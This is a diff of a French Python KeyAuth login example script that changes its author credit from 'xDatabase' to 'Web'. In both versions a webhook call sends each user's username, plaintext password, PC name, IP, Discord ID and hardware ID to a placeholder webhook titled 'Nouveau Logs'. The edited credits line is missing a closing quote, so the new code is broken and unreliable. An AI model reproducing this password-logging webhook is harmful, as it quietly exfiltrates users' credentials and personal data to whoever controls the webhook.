@@ -21,10 +21,10 @@ import requests
 
 def clear():
     if platform.system() == 'Windows':
-        os.system('cls & title Keyauth python exemple by xDatabase') 
+        os.system('cls & title Keyauth python exemple by Web') 
     elif platform.system() == 'Linux':
         os.system('clear')  
-        sys.stdout.write("\x1b]0;Keyauth python exemple by xDatabase\x07")
+        sys.stdout.write("\x1b]0;Keyauth python exemple by Web\x07")
     
 
 print("Chargement...")
@@ -190,7 +190,7 @@ avatar_url = get_avatar_url(discord_id)
 created_at = (datetime.fromtimestamp(int(keyauthapp.user_data.createdate), timezone.utc) + time_difference).strftime('%Y-%m-%d %H:%M:%S')
 last_login_at = (datetime.fromtimestamp(int(keyauthapp.user_data.lastlogin), timezone.utc) + time_difference).strftime('%Y-%m-%d %H:%M:%S')
 expires_at = (datetime.fromtimestamp(int(keyauthapp.user_data.expires), timezone.utc) + time_difference).strftime('%Y-%m-%d %H:%M:%S')
-keyauthapp.webhook("ton webhook id", "", f"{{\"content\": null, \"embeds\": [{{\"title\": \"**Nouveau Logs**\", \"description\": \"**🔐 Identifiant :**\\n```{keyauthapp.user_data.username}```\\n**📂 Mot de passe:**\\n```{password}```\\n**💻 Nom du PC:**\\n```{os.getenv('username')}```\\n**🌎 IP de l'utilisateur:**\\n```{keyauthapp.user_data.ip}```\\n**👀 ID Discord:**\\n```{discord_id}```\\n**⚙ Hardware ID:**\\n```{keyauthapp.user_data.hwid}```**🗓️ Créé le :**\\n```{created_at}```\\n**🔒 Dernière connexion :**\\n```{last_login_at}```\\n**⌛ Expire le :**\\n```{expires_at}```\\n\", \"color\": 14619925, \"footer\": {{\"text\": \"by xDatabase\"}}, \"thumbnail\": {{\"url\": \"{avatar_url}\"}}}}], \"attachments\": []}}", "application/json")
+keyauthapp.webhook("ton webhook id", "", f"{{\"content\": null, \"embeds\": [{{\"title\": \"**Nouveau Logs**\", \"description\": \"**🔐 Identifiant :**\\n```{keyauthapp.user_data.username}```\\n**📂 Mot de passe:**\\n```{password}```\\n**💻 Nom du PC:**\\n```{os.getenv('username')}```\\n**🌎 IP de l'utilisateur:**\\n```{keyauthapp.user_data.ip}```\\n**👀 ID Discord:**\\n```{discord_id}```\\n**⚙ Hardware ID:**\\n```{keyauthapp.user_data.hwid}```**🗓️ Créé le :**\\n```{created_at}```\\n**🔒 Dernière connexion :**\\n```{last_login_at}```\\n**⌛ Expire le :**\\n```{expires_at}```\\n\", \"color\": 14619925, \"footer\": {{\"text\": \"by Web\"}}, \"thumbnail\": {{\"url\": \"{avatar_url}\"}}}}], \"attachments\": []}}", "application/json")
 
 
 
@@ -201,7 +201,7 @@ banner = r"""
               | |                       | |                                ║ [1] option 1          [6] option 6         ║
               | |     Keyauth           | |                                ║ [2] option 2          [7] option 7         ║
               | |     Exemple           | |                                ║ [3] option 3          [8] option 8         ║
-              | |     By xDatabase      | |                                ║ [4] option 4          [§] by xDatabase     ║
+              | |     By Web            | |                                ║ [4] option 4          [§] by Web           ║
               | |                       | |                                ╚════════════════════════════════════════════╝ 
               |  \_____________________/  |
               |___________________________|
@@ -220,7 +220,7 @@ banner = r"""
 banner = fade.fire(banner)
 
 def print_credits():
-    print("Credits :\nGithub : https://github.com/xDatabaseDev \nDiscord : .xdatabase \nServeur Discord : https://dsc.gg/lomerta")
+    print("Credits :\nGithub : https://github.com/Web-on-dsc)
     input("\nAppuyez sur une touche pour revenir au menu principal...")
 
 def invalid_choice():
